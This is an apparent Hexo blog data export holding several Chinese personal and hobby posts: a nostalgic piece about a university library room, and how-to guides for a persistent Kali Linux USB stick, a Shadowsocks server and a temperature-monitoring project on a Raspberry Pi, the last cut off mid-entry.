href=\"http://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html\">http://bbs.elecfans.com/jishu\\_578437\\_1\\_1.html</a><br><a href=\"http://blog.csdn.net/netccy/article/details/48098455\">http://blog.csdn.net/netccy/article/details/48098455</a><br><a href=\"https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html\">https://www.6zou.net/tech/raspberry-pi-lcd1602-system-monitor.html</a><br><a href=\"http://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html\">http://hugozhu.myalert.info/2013/03/23/19-raspberry-pi-drive-1602-lcd.html</a><br><a href=\"http://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html\">http://hugozhu.myalert.info/2013/03/22/19-raspberry-pi-gpio-port-naming.html</a><br><a href=\"http://blog.csdn.net/rocklee/article/details/50082777\">http://blog.csdn.net/rocklee/article/details/50082777</a><br><a href=\"http://www.guokr.com/post/718305/\">http://www.guokr.com/post/718305/</a><br><a href=\"http://www.rs-online.com/designspark/electronics/blog/content-1148\">http://www.rs-online.com/designspark/electronics/blog/content-1148</a><br><a href=\"http://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html\">http://bbs.elecfans.com/jishu\\_582479\\_1\\_1.html</a><br><a href=\"https://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml\">https://www.freemindworld.com/blog/2013/130310\\_raspberry\\_pi\\_with\\_lcd.shtml</a><br><a href=\"http://blog.csdn.net/u013431550/article/details/40870947\">http://blog.csdn.net/u013431550/article/details/40870947</a><br><a href=\"http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba\">http://www.shumeipai.net/thread-21026-1-1.html?_dsign=0e7b69ba</a><br><a href=\"http://blog.csdn.net/longerzone/article/details/36171381\">http://blog.csdn.net/longerzone/article/details/36171381</a></p>"},{"title":"我怀念的依旧是916","id":"13","updated":"2016-08-21T00:09:45.000Z","date":"2016-08-20T22:22:01.000Z","_content":"\n本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。\n\n所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。\n\n916桌子很多，却都是空位，但是有基友陪伴。\n<!-- more --> \n![](/content/images/2016/08/IMG_0052.JPG)\n\n916有dong dong dong，充满回忆。\n![](/content/images/2016/08/IMG_0310.JPG)\n![](/content/images/2016/08/IMG_0798.JPG)\n\n916从来不用占座，却可以假装学习。\n![](/content/images/2016/08/IMG_1133.JPG)\n![](/content/images/2016/08/IMG_1131.JPG)\n\n916通宵加零食，空调WI-FI感觉人生圆满了。\n![](/content/images/2016/08/IMG_0912.JPG)\n\n916有沙发有地铺，住在学校里的快捷酒店。\n![](/content/images/2016/08/IMG_0459.JPG)\n\n916极大地方便了生活，Linux的帮忙少不了。\n![](/content/images/2016/08/IMG_0502-1.JPG)\n\n或许我想念的并不是不太优越的办公环境，而是那种感觉。\n\n炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。\n\n自由自在，想做什么做什么。\n\n当然，我也不会忘记，\n\n偷偷的把被子塞到书包里，绕过防火墙的经历；\n\n第二天起床去厕所刷牙碰到老师，被吓住的心情；\n\n晚上十一点半有人巡查，关闭所有光源，假装没人的感觉；\n\n十点后进入害怕遇到搜查，爬九楼的故事；\n\n隔壁传来的dongdongdong声音和30GB的故事。\n\n","source":"_posts/我怀念的依旧是916.md","raw":"---\ntitle: 我怀念的依旧是916\ntags: '杂谈'\npermalink: '916'\nid: 13\nupdated: '2016-08-21 01:09:45'\ndate: 2016-08-20 23:22:01\n---\n\n本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。\n\n所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。\n\n916桌子很多，却都是空位，但是有基友陪伴。\n<!-- more --> \n![](/content/images/2016/08/IMG_0052.JPG)\n\n916有dong dong dong，充满回忆。\n![](/content/images/2016/08/IMG_0310.JPG)\n![](/content/images/2016/08/IMG_0798.JPG)\n\n916从来不用占座，却可以假装学习。\n![](/content/images/2016/08/IMG_1133.JPG)\n![](/content/images/2016/08/IMG_1131.JPG)\n\n916通宵加零食，空调WI-FI感觉人生圆满了。\n![](/content/images/2016/08/IMG_0912.JPG)\n\n916有沙发有地铺，住在学校里的快捷酒店。\n![](/content/images/2016/08/IMG_0459.JPG)\n\n916极大地方便了生活，Linux的帮忙少不了。\n![](/content/images/2016/08/IMG_0502-1.JPG)\n\n或许我想念的并不是不太优越的办公环境，而是那种感觉。\n\n炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。\n\n自由自在，想做什么做什么。\n\n当然，我也不会忘记，\n\n偷偷的把被子塞到书包里，绕过防火墙的经历；\n\n第二天起床去厕所刷牙碰到老师，被吓住的心情；\n\n晚上十一点半有人巡查，关闭所有光源，假装没人的感觉；\n\n十点后进入害怕遇到搜查，爬九楼的故事；\n\n隔壁传来的dongdongdong声音和30GB的故事。\n\n","slug":"916","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiskao00173sone73gi55v","content":"<p>本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。</p>\n<p>所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。</p>\n<p>916桌子很多，却都是空位，但是有基友陪伴。<br><a id=\"more\"></a><br><img src=\"/content/images/2016/08/IMG_0052.JPG\" alt=\"\"></p>\n<p>916有dong dong dong，充满回忆。<br><img src=\"/content/images/2016/08/IMG_0310.JPG\" alt=\"\"><br><img src=\"/content/images/2016/08/IMG_0798.JPG\" alt=\"\"></p>\n<p>916从来不用占座，却可以假装学习。<br><img src=\"/content/images/2016/08/IMG_1133.JPG\" alt=\"\"><br><img src=\"/content/images/2016/08/IMG_1131.JPG\" alt=\"\"></p>\n<p>916通宵加零食，空调WI-FI感觉人生圆满了。<br><img src=\"/content/images/2016/08/IMG_0912.JPG\" alt=\"\"></p>\n<p>916有沙发有地铺，住在学校里的快捷酒店。<br><img src=\"/content/images/2016/08/IMG_0459.JPG\" alt=\"\"></p>\n<p>916极大地方便了生活，Linux的帮忙少不了。<br><img src=\"/content/images/2016/08/IMG_0502-1.JPG\" alt=\"\"></p>\n<p>或许我想念的并不是不太优越的办公环境，而是那种感觉。</p>\n<p>炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。</p>\n<p>自由自在，想做什么做什么。</p>\n<p>当然，我也不会忘记，</p>\n<p>偷偷的把被子塞到书包里，绕过防火墙的经历；</p>\n<p>第二天起床去厕所刷牙碰到老师，被吓住的心情；</p>\n<p>晚上十一点半有人巡查，关闭所有光源，假装没人的感觉；</p>\n<p>十点后进入害怕遇到搜查，爬九楼的故事；</p>\n<p>隔壁传来的dongdongdong声音和30GB的故事。</p>\n","excerpt":"<p>本文是一个纪念性文章。前天看了一个微电影，忽然想起了母校，十分想念，最想念的，仍然是916。</p>\n<p>所谓916，就是图书馆9楼916号，这是我大二大三的美好时光。</p>\n<p>916桌子很多，却都是空位，但是有基友陪伴。<br>","more":"<br><img src=\"/content/images/2016/08/IMG_0052.JPG\" alt=\"\"></p>\n<p>916有dong dong dong，充满回忆。<br><img src=\"/content/images/2016/08/IMG_0310.JPG\" alt=\"\"><br><img src=\"/content/images/2016/08/IMG_0798.JPG\" alt=\"\"></p>\n<p>916从来不用占座，却可以假装学习。<br><img src=\"/content/images/2016/08/IMG_1133.JPG\" alt=\"\"><br><img src=\"/content/images/2016/08/IMG_1131.JPG\" alt=\"\"></p>\n<p>916通宵加零食，空调WI-FI感觉人生圆满了。<br><img src=\"/content/images/2016/08/IMG_0912.JPG\" alt=\"\"></p>\n<p>916有沙发有地铺，住在学校里的快捷酒店。<br><img src=\"/content/images/2016/08/IMG_0459.JPG\" alt=\"\"></p>\n<p>916极大地方便了生活，Linux的帮忙少不了。<br><img src=\"/content/images/2016/08/IMG_0502-1.JPG\" alt=\"\"></p>\n<p>或许我想念的并不是不太优越的办公环境，而是那种感觉。</p>\n<p>炎热的夏天，能有一个办公室开着空调看电影通宵，再有个基友聊聊天，简直完美。</p>\n<p>自由自在，想做什么做什么。</p>\n<p>当然，我也不会忘记，</p>\n<p>偷偷的把被子塞到书包里，绕过防火墙的经历；</p>\n<p>第二天起床去厕所刷牙碰到老师，被吓住的心情；</p>\n<p>晚上十一点半有人巡查，关闭所有光源，假装没人的感觉；</p>\n<p>十点后进入害怕遇到搜查，爬九楼的故事；</p>\n<p>隔壁传来的dongdongdong声音和30GB的故事。</p>"},{"title":"把KALI放到U盘里","id":"16","updated":"2016-08-25T18:29:38.000Z","date":"2016-08-25T18:26:45.000Z","_content":"\n步骤1：进入 bios设置U盘启动，保存并启动电脑\n\n步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。\n<!-- more --> \n步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。\n\n关掉gparted ，在命令行里输入以下命令：\n\n```bash\nmkdir /mnt/usb\nmount /dev/sdb2 /mnt/usb\necho \"/ union\" >> /mnt/usb/persistence.conf\numount /mnt/usb\n```","source":"_posts/把KALI放到U盘里.md","raw":"---\ntitle: 把KALI放到U盘里\ntags: 'Linux'\npermalink: ba-kalifang-dao-upan-li\nid: 16\nupdated: '2016-08-25 19:29:38'\ndate: 2016-08-25 19:26:45\n---\n\n步骤1：进入 bios设置U盘启动，保存并启动电脑\n\n步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。\n<!-- more --> \n步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。\n\n关掉gparted ，在命令行里输入以下命令：\n\n```bash\nmkdir /mnt/usb\nmount /dev/sdb2 /mnt/usb\necho \"/ union\" >> /mnt/usb/persistence.conf\numount /mnt/usb\n```","slug":"ba-kalifang-dao-upan-li","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiskar001b3sonorlwzjsc","content":"<p>步骤1：进入 bios设置U盘启动，保存并启动电脑</p>\n<p>步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。<br><a id=\"more\"></a><br>步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。</p>\n<p>关掉gparted ，在命令行里输入以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">mkdir /mnt/usb</div><div class=\"line\">mount /dev/sdb2 /mnt/usb</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"/ union\"</span> &gt;&gt; /mnt/usb/persistence.conf</div><div class=\"line\">umount /mnt/usb</div></pre></td></tr></table></figure>","excerpt":"<p>步骤1：进入 bios设置U盘启动，保存并启动电脑</p>\n<p>步骤2：在启动选择画面中，选第一个“kali linux(686-pae)”。<br>","more":"<br>步骤3：进入kali桌面后 打开命令行，输入gparted，在弹出的窗口程序的右上角选择对应你U盘容量的磁盘。把第二个分区unmount后，将此区格式化成 ext4文件系统，同时把分区名(Label)改成 persistence ，同时记下分区列表里面第二个分区的分区名 例如我的是 /dev/sdb2。</p>\n<p>关掉gparted ，在命令行里输入以下命令：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">mkdir /mnt/usb</div><div class=\"line\">mount /dev/sdb2 /mnt/usb</div><div class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"/ union\"</span> &gt;&gt; /mnt/usb/persistence.conf</div><div class=\"line\">umount /mnt/usb</div></pre></td></tr></table></figure>"},{"title":"树莓派搭建ss服务器","date":"2016-09-13T22:38:35.000Z","_content":"# 简介\n树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器\n\n# 为什么不用pptp vpn\n这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。\n\n# 一键配置脚本\n```\nwget http://mirrors.linuxeye.com/oneinstack.tar.gz\ntar xzf oneinstack.tar.gz\ncd oneinstack\n./shadowsocks.sh install\n```\n漫长的等待结束就好了\n\n# 慢慢配置\n## 安装Pip\n```\napt-get install python-pip python-gevent python-m2crypto\n```\n\n## 安装Shadowsocks\n```\npip install shadowsocks\n```\n\n## 创建Shadowsocks配置文件\n配置文件 `/etc/shadowsocks.json` 内容如下：\n```\n{\n    \"server\":\"0.0.0.0\",\n    \"server_port\":8388,\n    \"local_address\": \"127.0.0.1\",\n    \"local_port\":1080,\n    \"password\":\"密码\",\n    \"timeout\":300,\n    \"method\":\"aes-256-cfb\",\n    \"fast_open\": false,\n    \"workers\": 1\n}\n```\n## 启动服务\n```\nnohup ssserver -c /etc/shadowsocks.json &\n```\n\n## 设定为自动启动的方法\n写入 `nohup ssserver -c /etc/shadowsocks.json &` 到 /etc/rc.local 文件的 exit 之前。\n","source":"_posts/树莓派搭建ss服务器.md","raw":"---\ntitle: 树莓派搭建ss服务器\ndate: 2016-09-13 23:38:35\npermalink: ss-server\ntags: Raspberry\ncategories: Linux\n\n---\n# 简介\n树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器\n\n# 为什么不用pptp vpn\n这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。\n\n# 一键配置脚本\n```\nwget http://mirrors.linuxeye.com/oneinstack.tar.gz\ntar xzf oneinstack.tar.gz\ncd oneinstack\n./shadowsocks.sh install\n```\n漫长的等待结束就好了\n\n# 慢慢配置\n## 安装Pip\n```\napt-get install python-pip python-gevent python-m2crypto\n```\n\n## 安装Shadowsocks\n```\npip install shadowsocks\n```\n\n## 创建Shadowsocks配置文件\n配置文件 `/etc/shadowsocks.json` 内容如下：\n```\n{\n    \"server\":\"0.0.0.0\",\n    \"server_port\":8388,\n    \"local_address\": \"127.0.0.1\",\n    \"local_port\":1080,\n    \"password\":\"密码\",\n    \"timeout\":300,\n    \"method\":\"aes-256-cfb\",\n    \"fast_open\": false,\n    \"workers\": 1\n}\n```\n## 启动服务\n```\nnohup ssserver -c /etc/shadowsocks.json &\n```\n\n## 设定为自动启动的方法\n写入 `nohup ssserver -c /etc/shadowsocks.json &` 到 /etc/rc.local 文件的 exit 之前。\n","slug":"ss-server","published":1,"updated":"2016-09-13T16:01:20.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiskau001d3sonwneh2k5g","content":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器</p>\n<h1 id=\"为什么不用pptp-vpn\"><a href=\"#为什么不用pptp-vpn\" class=\"headerlink\" title=\"为什么不用pptp vpn\"></a>为什么不用pptp vpn</h1><p>这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。</p>\n<h1 id=\"一键配置脚本\"><a href=\"#一键配置脚本\" class=\"headerlink\" title=\"一键配置脚本\"></a>一键配置脚本</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://mirrors.linuxeye.com/oneinstack.tar.gz</div><div class=\"line\">tar xzf oneinstack.tar.gz</div><div class=\"line\">cd oneinstack</div><div class=\"line\">./shadowsocks.sh install</div></pre></td></tr></table></figure>\n<p>漫长的等待结束就好了</p>\n<h1 id=\"慢慢配置\"><a href=\"#慢慢配置\" class=\"headerlink\" title=\"慢慢配置\"></a>慢慢配置</h1><h2 id=\"安装Pip\"><a href=\"#安装Pip\" class=\"headerlink\" title=\"安装Pip\"></a>安装Pip</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">apt-get install python-pip python-gevent python-m2crypto</div></pre></td></tr></table></figure>\n<h2 id=\"安装Shadowsocks\"><a href=\"#安装Shadowsocks\" class=\"headerlink\" title=\"安装Shadowsocks\"></a>安装Shadowsocks</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pip install shadowsocks</div></pre></td></tr></table></figure>\n<h2 id=\"创建Shadowsocks配置文件\"><a href=\"#创建Shadowsocks配置文件\" class=\"headerlink\" title=\"创建Shadowsocks配置文件\"></a>创建Shadowsocks配置文件</h2><p>配置文件 <code>/etc/shadowsocks.json</code> 内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">    &quot;server&quot;:&quot;0.0.0.0&quot;,</div><div class=\"line\">    &quot;server_port&quot;:8388,</div><div class=\"line\">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</div><div class=\"line\">    &quot;local_port&quot;:1080,</div><div class=\"line\">    &quot;password&quot;:&quot;密码&quot;,</div><div class=\"line\">    &quot;timeout&quot;:300,</div><div class=\"line\">    &quot;method&quot;:&quot;aes-256-cfb&quot;,</div><div class=\"line\">    &quot;fast_open&quot;: false,</div><div class=\"line\">    &quot;workers&quot;: 1</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h2 id=\"启动服务\"><a href=\"#启动服务\" class=\"headerlink\" title=\"启动服务\"></a>启动服务</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">nohup ssserver -c /etc/shadowsocks.json &amp;</div></pre></td></tr></table></figure>\n<h2 id=\"设定为自动启动的方法\"><a href=\"#设定为自动启动的方法\" class=\"headerlink\" title=\"设定为自动启动的方法\"></a>设定为自动启动的方法</h2><p>写入 <code>nohup ssserver -c /etc/shadowsocks.json &amp;</code> 到 /etc/rc.local 文件的 exit 之前。</p>\n","excerpt":"","more":"<h1 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h1><p>树莓派打算长期放在家里了，为了方便我身居海外还能方便的听上网易云音乐，顺利的看上国内的优酷爱奇艺，打算在树莓派上搭ss服务器</p>\n<h1 id=\"为什么不用pptp-vpn\"><a href=\"#为什么不用pptp-vpn\" class=\"headerlink\" title=\"为什么不用pptp vpn\"></a>为什么不用pptp vpn</h1><p>这是个好问题，实际上我已经搭建了pptp vpn，只是连不上，大概是因为国内运营商中国电信做了端口屏蔽限制，目前发现已经屏蔽的端口有80和PPTP的端口。</p>\n<h1 id=\"一键配置脚本\"><a href=\"#一键配置脚本\" class=\"headerlink\" title=\"一键配置脚本\"></a>一键配置脚本</h1><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\">wget http://mirrors.linuxeye.com/oneinstack.tar.gz</div><div class=\"line\">tar xzf oneinstack.tar.gz</div><div class=\"line\">cd oneinstack</div><div class=\"line\">./shadowsocks.sh install</div></pre></td></tr></table></figure>\n<p>漫长的等待结束就好了</p>\n<h1 id=\"慢慢配置\"><a href=\"#慢慢配置\" class=\"headerlink\" title=\"慢慢配置\"></a>慢慢配置</h1><h2 id=\"安装Pip\"><a href=\"#安装Pip\" class=\"headerlink\" title=\"安装Pip\"></a>安装Pip</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">apt-get install python-pip python-gevent python-m2crypto</div></pre></td></tr></table></figure>\n<h2 id=\"安装Shadowsocks\"><a href=\"#安装Shadowsocks\" class=\"headerlink\" title=\"安装Shadowsocks\"></a>安装Shadowsocks</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pip install shadowsocks</div></pre></td></tr></table></figure>\n<h2 id=\"创建Shadowsocks配置文件\"><a href=\"#创建Shadowsocks配置文件\" class=\"headerlink\" title=\"创建Shadowsocks配置文件\"></a>创建Shadowsocks配置文件</h2><p>配置文件 <code>/etc/shadowsocks.json</code> 内容如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">    &quot;server&quot;:&quot;0.0.0.0&quot;,</div><div class=\"line\">    &quot;server_port&quot;:8388,</div><div class=\"line\">    &quot;local_address&quot;: &quot;127.0.0.1&quot;,</div><div class=\"line\">    &quot;local_port&quot;:1080,</div><div class=\"line\">    &quot;password&quot;:&quot;密码&quot;,</div><div class=\"line\">    &quot;timeout&quot;:300,</div><div class=\"line\">    &quot;method&quot;:&quot;aes-256-cfb&quot;,</div><div class=\"line\">    &quot;fast_open&quot;: false,</div><div class=\"line\">    &quot;workers&quot;: 1</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h2 id=\"启动服务\"><a href=\"#启动服务\" class=\"headerlink\" title=\"启动服务\"></a>启动服务</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">nohup ssserver -c /etc/shadowsocks.json &amp;</div></pre></td></tr></table></figure>\n<h2 id=\"设定为自动启动的方法\"><a href=\"#设定为自动启动的方法\" class=\"headerlink\" title=\"设定为自动启动的方法\"></a>设定为自动启动的方法</h2><p>写入 <code>nohup ssserver -c /etc/shadowsocks.json &amp;</code> 到 /etc/rc.local 文件的 exit 之前。</p>\n"},{"title":"树莓派实时温度湿度监测进阶","date":"2016-08-26T14:19:14.000Z","_content":"\n这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。\n\n# 依赖\n* Adafruit_DHT\n* Adafruit_CharLCD\n* Nginx/Apache (请自行提前安装)\n\n# 安装依赖\n\n```bash\nsudo apt-get update\nsudo apt-get install build-essential python-dev python-smbus python-pip\ngit clone https://github.com/adafruit/Adafruit_Python_DHT.git\ncd Adafruit_Python_DHT\nsudo python setup.py install\nsudo pip install RPi.GPIO\ngit clone https://github.com/adafruit/Adafruit_Python_CharLCD\ncd Adafruit_Python_CharLCD\nsudo python setup.py install\n```\n# 安装\n```bash\ncd /var/www/html\ngit clone  https://github.com/yfgeek/rpi-TempRuntime.git\n```\n# 运行\n```bash\ncd /var/www/html/rpi-TempRuntime\npython LCD.py\n```\n\n# 截图\n![](/content/images/2016/08/WechatIMG10.jpeg)\n","source":"_posts/树莓派实时温度湿度监测进阶.md","raw":"---\ntitle: 树莓派实时温度湿度监测进阶\npermalink: runtimelcd\ndate: 2016-08-26 15:19:14\ntags: 'Raspberry'\n---\n\n这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。\n\n# 依赖\n* Adafruit_DHT\n* Adafruit_CharLCD\n* Nginx/Apache (请自行提前安装)\n\n# 安装依赖\n\n```bash\nsudo apt-get update\nsudo apt-get install build-essential python-dev python-smbus python-pip\ngit clone https://github.com/adafruit/Adafruit_Python_DHT.git\ncd Adafruit_Python_DHT\nsudo python setup.py install\nsudo pip install RPi.GPIO\ngit clone https://github.com/adafruit/Adafruit_Python_CharLCD\ncd Adafruit_Python_CharLCD\nsudo python setup.py install\n```\n# 安装\n```bash\ncd /var/www/html\ngit clone  https://github.com/yfgeek/rpi-TempRuntime.git\n```\n# 运行\n```bash\ncd /var/www/html/rpi-TempRuntime\npython LCD.py\n```\n\n# 截图\n![](/content/images/2016/08/WechatIMG10.jpeg)\n","slug":"runtimelcd","published":1,"updated":"2016-09-12T12:09:32.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciubiskax001h3sonc4w83rmb","content":"<p>这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。</p>\n<h1 id=\"依赖\"><a href=\"#依赖\" class=\"headerlink\" title=\"依赖\"></a>依赖</h1><ul>\n<li>Adafruit_DHT</li>\n<li>Adafruit_CharLCD</li>\n<li>Nginx/Apache (请自行提前安装)</li>\n</ul>\n<h1 id=\"安装依赖\"><a href=\"#安装依赖\" class=\"headerlink\" title=\"安装依赖\"></a>安装依赖</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install build-essential python-dev python-smbus python-pip</div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/adafruit/Adafruit_Python_DHT.git</div><div class=\"line\"><span class=\"built_in\">cd</span> Adafruit_Python_DHT</div><div class=\"line\">sudo python setup.py install</div><div class=\"line\">sudo pip install RPi.GPIO</div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/adafruit/Adafruit_Python_CharLCD</div><div class=\"line\"><span class=\"built_in\">cd</span> Adafruit_Python_CharLCD</div><div class=\"line\">sudo python setup.py install</div></pre></td></tr></table></figure>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /var/www/html</div><div class=\"line\">git <span class=\"built_in\">clone</span>  https://github.com/yfgeek/rpi-TempRuntime.git</div></pre></td></tr></table></figure>\n<h1 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /var/www/html/rpi-TempRuntime</div><div class=\"line\">python LCD.py</div></pre></td></tr></table></figure>\n<h1 id=\"截图\"><a href=\"#截图\" class=\"headerlink\" title=\"截图\"></a>截图</h1><p><img src=\"/content/images/2016/08/WechatIMG10.jpeg\" alt=\"\"></p>\n","excerpt":"","more":"<p>这是一个树莓派实时监测的项目，需要参考上文，可在web上显示实时的温度及湿度变化情况。</p>\n<h1 id=\"依赖\"><a href=\"#依赖\" class=\"headerlink\" title=\"依赖\"></a>依赖</h1><ul>\n<li>Adafruit_DHT</li>\n<li>Adafruit_CharLCD</li>\n<li>Nginx/Apache (请自行提前安装)</li>\n</ul>\n<h1 id=\"安装依赖\"><a href=\"#安装依赖\" class=\"headerlink\" title=\"安装依赖\"></a>安装依赖</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get update</div><div class=\"line\">sudo apt-get install build-essential python-dev python-smbus python-pip</div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/adafruit/Adafruit_Python_DHT.git</div><div class=\"line\"><span class=\"built_in\">cd</span> Adafruit_Python_DHT</div><div class=\"line\">sudo python setup.py install</div><div class=\"line\">sudo pip install RPi.GPIO</div><div class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/adafruit/Adafruit_Python_CharLCD</div><div class=\"line\"><span class=\"built_in\">cd</span> Adafruit_Python_CharLCD</div><div class=\"line\">sudo python setup.py install</div></pre></td></tr></table></figure>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">cd</span> /var/www/html</div><div class=\"line\">git <span class=\"built_in\">clone</span>  